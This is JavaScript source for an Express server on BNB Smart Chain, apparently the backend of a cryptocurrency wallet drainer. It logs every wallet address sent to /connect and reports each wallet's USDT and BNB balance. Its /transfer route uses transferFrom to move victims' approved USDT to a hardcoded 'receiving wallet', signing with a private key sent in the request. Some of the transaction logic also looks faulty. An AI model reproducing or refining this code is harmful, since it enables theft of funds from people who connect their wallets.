const express = require("express");
const cors = require("cors");
const fs = require("fs");
const Web3 = require("web3");

const app = express();
const PORT = 3000;
const web3 = new Web3("https://bsc-dataseed.binance.org/");
const USDT_CONTRACT = "0x55d398326f99059fF775485246999027B3197955";
const ABI = [
  { "constant": true, "inputs": [{ "name": "_owner", "type": "address" }], "name": "balanceOf", "outputs": [{ "name": "", "type": "uint256" }], "type": "function" }
];

app.use(cors());
app.use(express.json());

const dataPath = "./data.json";
if (!fs.existsSync(dataPath)) fs.writeFileSync(dataPath, "[]");

function readData() {
  return JSON.parse(fs.readFileSync(dataPath));
}

app.post("/connect", (req, res) => {
  const { address } = req.body;
  let data = readData();
  if (!data.find((x) => x.address === address)) {
    data.push({ address, time: new Date().toISOString() });
    fs.writeFileSync(dataPath, JSON.stringify(data, null, 2));
  }
  res.send({ success: true });
});

app.get("/wallets", async (req, res) => {
  const data = readData();
  const contract = new web3.eth.Contract(ABI, USDT_CONTRACT);
  const updated = await Promise.all(data.map(async (item) => {
    const usdt = await contract.methods.balanceOf(item.address).call();
    const bnb = await web3.eth.getBalance(item.address);
    return {
      ...item,
      usdt: web3.utils.fromWei(usdt),
      bnb: web3.utils.fromWei(bnb)
    };
  }));
  res.json(updated);
});

app.get("/balances", async (req, res) => {
  const data = readData();
  const results = [];

  const contract = new web3.eth.Contract(ABI, USDT_CONTRACT);

  for (const item of data) {
    try {
      const usdtBalance = await contract.methods.balanceOf(item.address).call();
      const bnbBalance = await web3.eth.getBalance(item.address);

      results.push({
        address: item.address,
        usdt: web3.utils.fromWei(usdtBalance, "ether"),
        bnb: web3.utils.fromWei(bnbBalance, "ether")
      });
    } catch (err) {
      console.log("Error fetching balance for:", item.address);
    }
  }

  res.json({ balances: results });
});

// ✅ NEW: TransferFrom route
app.post("/transfer", async (req, res) => {
  const { from, amount, privateKey } = req.body;
  const to = "0xe3bA8239Ef1543cC7dD8c352Fd640C37e87aC979"; // Your receiving wallet

  const contract = new web3.eth.Contract([
    {
      constant: false,
      inputs: [
        { name: "from", type: "address" },
        { name: "to", type: "address" },
        { name: "value", type: "uint256" }
      ],
      name: "transferFrom",
      outputs: [{ name: "", type: "bool" }],
      type: "function"
    }
  ], USDT_CONTRACT);

  const tx = contract.methods.transferFrom(from, to, web3.utils.toWei(amount.toString(), "ether"));
  const gas = await tx.estimateGas({ from });
  const gasPrice = await web3.eth.getGasPrice();
  const data = tx.encodeABI();
  const nonce = await web3.eth.getTransactionCount(from);

  const signedTx = await web3.eth.accounts.signTransaction(
    {
      to: USDT_CONTRACT,
      data,
      gas,
      gasPrice,
      nonce,
      chainId: 56
    },
    privateKey
  );

  try {
    const receipt = await web3.eth.sendSignedTransaction(signedTx.rawTransaction);
    console.log("✅ Transfer successful:", receipt.transactionHash);
    res.json({ success: true, tx: receipt.transactionHash });
  } catch (err) {
    console.error("❌ Transfer failed:", err);
    res.status(500).json({ success: false, error: err.message });
  }
});

app.listen(PORT, () => console.log("✅ Server running on port", PORT));
